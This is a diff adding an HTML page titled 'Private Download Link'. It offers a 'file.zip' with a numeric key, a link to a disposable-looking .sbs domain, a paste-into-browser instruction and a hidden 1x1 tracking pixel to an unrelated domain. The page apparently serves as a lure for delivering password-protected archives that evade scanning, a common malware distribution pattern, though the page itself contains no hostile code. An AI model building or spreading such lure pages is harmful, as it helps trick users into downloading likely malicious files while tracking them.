@@ -1,0 +1,216 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Private Download Link</title>
+  <link rel="icon" href="/lock.png" type="image/png">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+
+  <style>
+    :root {
+      --c-accent: #0d6efd;
+      --c-accent-hover: #0b5ed7;
+      --c-bg: #f9fbff;
+      --c-box: #ffffff;
+      --c-text: #222;
+      --c-sub: #666;
+      --c-border: #d8d8d8;
+      --c-ok: #28a745;
+      --c-error: #dc3545;
+      --c-key-bg: #e7f1ff;
+      --c-key-text: #0d6efd;
+    }
+
+    body {
+      font-family: "Segoe UI", Tahoma, sans-serif;
+      background: var(--c-bg);
+      margin: 0;
+      padding: 0;
+      transition: background 0.6s ease;
+    }
+
+    .card-download {
+      max-width: 680px;
+      margin: 80px auto;
+      background: var(--c-box);
+      border-radius: 14px;
+      padding: 36px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.12);
+      text-align: center;
+    }
+
+    .card-download h2 {
+      font-size: 28px;
+      margin-bottom: 28px;
+      color: var(--c-text);
+    }
+
+    .file-box {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border: 1px solid var(--c-border);
+      background: #fdfdfd;
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 24px;
+    }
+
+    .meta {
+      display: flex;
+      align-items: center;
+    }
+
+    .meta .icon {
+      font-size: 24px;
+      margin-right: 12px;
+      color: var(--c-accent);
+    }
+
+    .meta strong {
+      font-size: 17px;
+      color: var(--c-text);
+      display: block;
+    }
+
+    .meta span {
+      font-size: 14px;
+      color: var(--c-sub);
+    }
+
+    .key {
+      background: var(--c-key-bg);
+      padding: 12px 22px;
+      border-radius: 10px;
+      font-weight: bold;
+      color: var(--c-key-text);
+      font-size: 16px;
+    }
+
+    .key::after {
+      content: "Key";
+      display: block;
+      font-size: 12px;
+      color: var(--c-sub);
+      margin-top: 3px;
+    }
+
+    .link-box {
+      display: flex;
+      align-items: center;
+      border: 1px solid var(--c-border);
+      border-radius: 10px;
+      padding: 10px 14px;
+      background: #fdfdfd;
+      margin-bottom: 18px;
+    }
+
+    .link-box input {
+      flex: 1;
+      border: none;
+      outline: none;
+      background: transparent;
+      font-size: 14px;
+      color: var(--c-text);
+    }
+
+    .btn {
+      background: var(--c-accent);
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 9px 18px;
+      font-size: 14px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      transition: background 0.3s;
+    }
+
+    .btn i { margin-right: 6px; }
+    .btn:hover { background: var(--c-accent-hover); }
+
+    .notice {
+      font-size: 14px;
+      color: var(--c-sub);
+    }
+
+    .toast {
+      position: fixed;
+      top: 16px;
+      left: 50%;
+      transform: translateX(-50%);
+      display: none;
+      align-items: center;
+      padding: 14px 22px;
+      border-radius: 7px;
+      color: #fff;
+      font-size: 15px;
+      box-shadow: 0 4px 14px rgba(0,0,0,0.2);
+      z-index: 999;
+    }
+    .toast i { margin-right: 8px; }
+    .toast-ok { background: var(--c-ok); }
+    .toast-error { background: var(--c-error); }
+  </style>
+</head>
+<body>
+  <div id="msgOk" class="toast toast-ok"><i class="fas fa-check-circle"></i> Link copied!</div>
+  <div id="msgError" class="toast toast-error"><i class="fas fa-times-circle"></i> Could not copy!</div>
+
+  <div class="card-download">
+    <h2>Your Download is Ready</h2>
+    <div class="file-box">
+      <div class="meta">
+        <i class="fas fa-file-zipper icon"></i>
+        <div>
+          <strong>file.zip</strong>
+          <span>22.5 MB</span>
+        </div>
+      </div>
+      <div class="key">9684</div>
+    </div>
+
+    <div class="link-box">
+      <input id="fileLink" type="text" value="https://data2.cloud9342.sbs/g/zip/tuf3OwVcADEx1qK6sWlCvrj6/file.zip" readonly>
+      <button class="btn" onclick="copyFileLink()"><i class="fas fa-copy"></i> Copy</button>
+    </div>
+
+    <p class="notice">If the link is inactive, copy & paste it into your browser bar.</p>
+  </div>
+  <img width="1" height="1" src="https://camaligsalvatrefoils.com/rtb/p/c/AFug2GhYdAUACocCAFZOFwASAAAAAACv"/>
+
+  <script>
+    function bgRand() {
+      const h = Math.floor(Math.random() * 360);
+      const s = 35 + Math.floor(Math.random() * 25);
+      const l = 55 + Math.floor(Math.random() * 15);
+      return `hsl(${h}, ${s}%, ${l}%)`;
+    }
+    document.body.style.background = bgRand();
+
+    function showToast(id, time = 2500) {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.style.display = "flex";
+      setTimeout(() => { el.style.display = "none"; }, time);
+    }
+
+    function copyFileLink() {
+      const field = document.getElementById("fileLink");
+      field.select();
+      field.setSelectionRange(0, 99999);
+      navigator.clipboard.writeText(field.value).then(() => {
+        showToast("msgOk");
+      }).catch(() => {
+        showToast("msgError");
+      });
+    }
+  </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"e614c609acb24612b507f2a82c18d059","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
+
